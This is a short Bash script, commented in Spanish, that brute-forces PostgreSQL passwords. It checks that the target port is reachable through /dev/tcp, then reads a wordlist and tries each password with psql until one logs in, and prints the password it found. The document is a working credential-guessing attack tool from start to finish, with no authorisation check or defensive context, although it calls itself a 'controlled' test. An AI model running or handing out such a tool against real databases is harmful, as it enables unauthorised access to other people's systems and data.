#!/bin/bash

# --- Valores por defecto ---
HOST="127.0.0.1"
PORT="5432"
DB="postgres"
USER="postgres"
PASS_FILE=""
SKIP_PORT_CHECK=false  # Por defecto sí hace la validación

# --- Procesamiento de argumentos (Agregada opción -S) ---
while getopts "h:p:d:U:f:S" opt; do
  case $opt in
    h) HOST=$OPTARG ;;
    p) PORT=$OPTARG ;;
    d) DB=$OPTARG ;;
    U) USER=$OPTARG ;;
    f) PASS_FILE=$OPTARG ;;
    S) SKIP_PORT_CHECK=true ;; # Desactiva la validación si se pasa -S
    *) echo "Uso: $0 -f lista_pass.txt [-h host] [-p puerto] [-d db] [-U usuario] [-S skip check]"; exit 1 ;;
  esac
done

# Validación de archivo de contraseñas
if [[ -z "$PASS_FILE" ]] || [[ ! -f "$PASS_FILE" ]]; then
  echo "Error: Debes especificar un archivo de contraseñas válido con -f"
  exit 1
fi

# --- Validación de alcance al puerto (Nueva Mejora) ---
if [ "$SKIP_PORT_CHECK" = false ]; then
    echo -n "Validando conexión al puerto $PORT en $HOST... "
    timeout 3s bash -c "echo > /dev/tcp/$HOST/$PORT" 2>/dev/null
    
    if [ $? -ne 0 ]; then
        echo "ERROR: No hay alcance al puerto $PORT. Revisa el host o firewall."
        exit 1
    fi
    echo "¡Puerto alcanzable!"
fi

echo "Iniciando prueba de fuerza bruta controlada..."
echo "Objetivo: $USER@$HOST:$PORT/$DB"
echo "------------------------------------------------"

# --- Bucle de ejecución ---
while IFS= read -r password; do
    # Saltamos líneas vacías si las hay
    [[ -z "$password" ]] && continue
    
    echo -n "Probando: $password ... "
    
    # Intentamos la conexión
    PGPASSWORD="$password" timeout 5s psql -h "$HOST" -p "$PORT" -d "$DB" -U "$USER" -c "SELECT 1" > /dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        echo "¡ÉXITO! La contraseña es: $password"
        exit 0
    else
        echo "Fallido."
    fi
done < "$PASS_FILE"

echo "------------------------------------------------"
echo "Prueba terminada. No se encontró la contraseña."

